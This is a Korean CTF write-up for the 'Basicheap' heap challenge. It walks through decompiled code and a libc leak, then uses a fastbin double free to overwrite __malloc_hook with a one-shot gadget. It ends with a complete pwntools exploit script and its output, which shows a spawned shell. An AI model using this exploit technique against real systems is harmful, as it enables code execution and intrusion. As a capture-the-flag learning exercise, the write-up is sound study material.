---
title: TenDollar CTF - Basicheap
date: 2018-11-30 00:06:52
---

```c
unsigned __int64 sub_980()
{
  int v0; // ebx
  int v2; // [rsp+4h] [rbp-1Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-18h]

  v3 = __readfsqword(0x28u);
  puts("Input Length");
  _isoc99_scanf("%d", &v2);
  v0 = dword_20202C;
  qword_202030[v0] = malloc(v2);
  puts("Input Memo!");
  read(0, qword_202030[dword_20202C], v2);
  ++dword_20202C;
  puts("Create Note Done.\n");
  return __readfsqword(0x28u) ^ v3;
}
```

1번 메뉴에서 사이즈를 지정하여 malloc을 해줌

```c
unsigned __int64 sub_A59()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("Choose Note");
  _isoc99_scanf("%d", &v1);
  puts((const char *)qword_202030[v1]);
  return __readfsqword(0x28u) ^ v2;
}
```

2번 메뉴로 릭이 가능하다.

```c
unsigned __int64 sub_AD2()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  v1 = 0;
  puts("Choose Note");
  _isoc99_scanf("%d", &v1);
  free(qword_202030[v1]);
  puts("Delete Note Done.\n");
  return __readfsqword(0x28u) ^ v2;
}
```

3번 메뉴 free가 자유롭다. 

공격 시나리오는 fastbin fastbin smallbin fastbin -> smallbin free (libc leak) -> fastbin double free -> malloc_hook overwrite 



일단 처음부터 0x60으로 만들어서 나중에 귀찮지 않게 처음부터 fake chunk size에 맞춰주고 smallbin, top chunk와 병합을 하지 않을 fastbin을 하나 더 만들고 smallbin free 후 libc leak을 한다.

fake chunk를 할당할 주소는 malloc_hook-35 지점인데 

```c
gdb-peda$ x/10gx 0x7f189914faed + 35
0x7f189914fb10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
```

저 malloc_hook 지점에 overwrite를 하기 위해선 일단 malloc_hook - 0x10 지점에 chunk를 할당해야 하는데..

```c
gdb-peda$ x/10gx 0x7f189914faed + 25
0x7f189914fb06 <__memalign_hook+6>:	0x7f1898e10a000000	0x0000000000000000
```

이 지점에서 보면 size 필드가 0이므로 size error가 나기 때문에 할당을 할 수가 없다. 결국 넣을만한 size 필드를 찾아서 넣어줘야 한다.

```c
gdb-peda$ x/10gx 0x7f189914faed
0x7f189914faed <_IO_wide_data_0+301>:	0x189914e260000000	0x000000000000007f
```

size 필드가 7f이기 때문에 처음부터 0x60 size의 chunk를 할당해 준 것!

```c
gdb-peda$ x/2gx 0x7f6373edaaed + 35
0x7f6373edab10 <__malloc_hook>:	0x00007f6373c07147	0x000000000000000a
gdb-peda$ x/gx 0x00007f6373c07147
0x7f6373c07147 <exec_comm+2263>
```

malloc_hook에 원샷 가젯을 넣고 다시 malloc을 하면 쉘이 실행된다.

```python
from pwn import * 

t = process("./tf")

def c(a,b):
    t.sendlineafter("Quit","1")
    t.sendlineafter("Input Length",str(a))
    t.sendlineafter("Input Memo!",str(b))

def s(a):
    t.sendlineafter("Quit","2")
    t.sendlineafter("Note",str(a))

def d(a):
    t.sendlineafter("Quit","3")
    t.sendlineafter("Note",str(a))

c(0x60,"a")
c(0x60,"")
c(0x100,"b")
c(0x60,"c")

d(2)
s(2)

t.recvline()
ma = u64(t.recv(6).ljust(8,'\x00'))
#print hex(ma)

libc = ma - 0x3c4b78
log.success("libc : " + hex(libc))
malloc_hook = libc + 0x00000000003C4B10
log.success("malloc_hook : " + hex(malloc_hook))
one = libc + 0x00000000000F1147
log.success("oneshot : " + hex(one))
c(0x100,"b")

d(0)
d(1)
d(0)

c(0x60,p64(malloc_hook-35))
c(0x60,"a")
c(0x60,"b")
pause()
c(0x60,"a"*3 + p64(one)*3)
pause()
t.sendline("1")
t.sendline("1")

t.interactive()
->
bskim@bsbuntu:~/pwnable/heap$ python tf.py
[+] Starting local process './tf': pid 14771
[+] libc : 0x7f32af032000
[+] malloc_hook : 0x7f32af3f6b10
[+] oneshot : 0x7f32af123147
[*] Paused (press any to continue)
[*] Paused (press any to continue)
[*] Switching to interactive mode

Create Note Done.

Simple Note!!
1. Create Note
2. Show your Memo
3. Delete Note
4. Quit
Input Length
$ id
uid=1000(bskim)
```

최종 익스코드 
